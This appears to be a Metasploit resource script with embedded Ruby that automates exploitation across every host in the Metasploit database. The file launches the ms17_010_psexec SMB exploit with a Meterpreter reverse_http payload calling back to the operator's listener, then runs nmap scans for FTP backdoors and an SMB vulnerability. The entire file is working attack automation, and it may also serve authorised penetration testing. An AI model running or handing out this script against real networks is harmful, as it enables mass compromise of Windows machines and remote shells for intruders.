<ruby>
   help = %Q|
      Description:
      This Metasploit RC file can be used to automate the exploitation process.
      In this example we use db_nmap to populate msfdb database with hosts.
      
   |
   print_line(help)
   Rex::sleep(0.5)
   if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
      print_line("[!] Please set RHOSTS")
      return nil
   end
   if (framework.datastore['LHOST'] == nil or framework.datastore['LHOST'] == '')
      print_line("[!] Please set an LHOST")
      return nil
   end
   xhost = framework.db.hosts.map(&:address).join(' ')
   run_single("setg RHOSTS #{xhost}")
   run_single("use exploit/windows/smb/ms17_010_psexec")
   run_single("set PAYLOAD windows/meterpreter/reverse_http")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8082")
   run_single("set DisablePayloadHandler True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)

   run_single("db_nmap -n -T4 -p 21 --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 --open #{framework.datastore['RHOSTS']}")
   Rex::sleep(15.0)
   run_single("db_nmap -n -T4 -p 139,445 --script=smb-vuln-cve-2017-7494 --open #{framework.datastore['RHOSTS']}")
   Rex::sleep(15.0)
</ruby>

